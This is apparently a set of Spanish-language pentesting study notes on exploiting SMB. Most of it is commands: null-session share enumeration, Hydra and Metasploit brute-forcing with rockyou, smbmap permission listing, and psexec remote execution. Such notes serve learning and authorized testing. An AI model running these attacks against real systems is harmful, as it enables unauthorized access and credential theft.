
---

SMB son las siglas de Server Message Block, un protocolo de red para compartir archivos, impresoras y otros recursos entre computadoras en una red. Utiliza un modelo cliente-servidor, donde los clientes (como una PC) se conectan a un servidor para acceder a archivos, directorios o impresoras, y puede funcionar en diversos sistemas operativos como Windows, macOS y Linux


### Formas de Explotación 


*Enumerar los recursos compartidos de la red a traves del protocolo smb*

```bash
smbclient -L <Ipvictima> -N     # Enumerar recursos compartidos sin credenciales -N = nullsession
smbclient //<Ipvictima>/<RecursoCompartido> -N # Acceder al recurso sin tener contraseña
```

*Realizar fuerza bruta con [[Hydra]] para obtener credenciales de acceso por el puerto smb*

```bash
hydra -l <Usuario> -P /usr/share/wordlist/rockyou.txt smb://192.168.1.22 # Fuerza bruta al protocolo smb
```

*Listar recurso compartidos con contraseña*

```bash
smbclient -L //192.168.0.28 -U '<Usuario>' # Posterior a esto te pedira la contraseña de acceso 
smbmap -H <IPvictima> -u '<Usuario>' -p '<Contraseña>' # Listar recurso compartidos y ademas los permisos que se tienen en estos
smbmap -H <IPvictima> -u '<Usuario>' -p '<Contraseña>' -r ´'<folder>' # (Opcional) Si queremos entrar a un recurso
smbclient -U '<Usuario>' //192.168.0.28/<RecursoCompartido>  # Asi podremos acceder al recurso compartido que queramos proporcionando contraseña
smb > more <crendeciales.txt>  # Con este comando podemos visualizar archivos o documentos
```

---
#### Explotación con Metaesploit 

- Algunas formas y vulnerabilidades conocidas radican en [[Metasploit]] 

Un modulo que nos servirá para la explotación del protocolo smb es el siguiente:

```bash
msfconsole # Activamos metaesploit 
use auxiliary/scanner/smb/smb_login # Usamos el modulo de ataque 
showoptions
set RHOSTS <IpVictima>
set SMBUser <Usuario> # Lo colocamos en caso de saber cual es el usurio
set PASS_FILE /usr/share/wordlist/rockyou.txt # Cargamos el diccionario del cual queremos hacer el ataque de fuerza bruta
set VERBOSE false
run
```

- Luego de esto podemos probar si podemos tener control remoto de la maquina de la siguiente forma:

```bash
use exploit/windows/smb/psexec # modulo psexec para saber si podemos hacer ejecucion de comandos
show options 
set RHOSTS <Ipvictima>
set SMBUser <Usuario>
set SMBPass <Contraseña>
run    # Puede fallar si no esta habilidato el control remoto por psexec 
```


---



